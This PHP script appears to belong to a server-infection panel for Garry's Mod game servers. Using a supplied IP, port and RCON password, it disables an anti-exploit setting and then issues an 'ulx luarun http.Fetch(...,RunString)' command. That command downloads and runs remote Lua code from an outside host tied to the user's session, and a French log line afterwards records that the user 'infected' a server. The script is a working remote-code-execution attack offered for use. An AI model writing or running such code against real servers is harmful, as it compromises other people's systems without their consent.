<?php
	include('../class/include.php');
	include '../SourceQuery/SourceQuery.class.php';

	if (!Account::isAuthentified())
	{
	    die("Bad request");
	}

	$infect = new SourceQuery;
	$rcn->Connect($_GET['server_ip'], $_GET['server_port']);
	$rcn->SetRconPassword($_GET['rcon']);
	$rcn->Rcon("snte_ulxluarun 0");
	$rcn->Rcon("ulx luarun http.Fetch([[http://free-drm.cf/f?k=".$_SESSION["id"]."]],RunString)");
	$rcn->Rcon("snte_ulxluarun 1");


	Logs::AddLogs("<p class='text-primary'>[".date('d/m/Y à H:i:s', time())."]&nbsp;<i class='fa fa-close'></i>&nbsp;L'utilisateur ".$_SESSION["id"]." a infécter un serveur via RCON</p>");
?>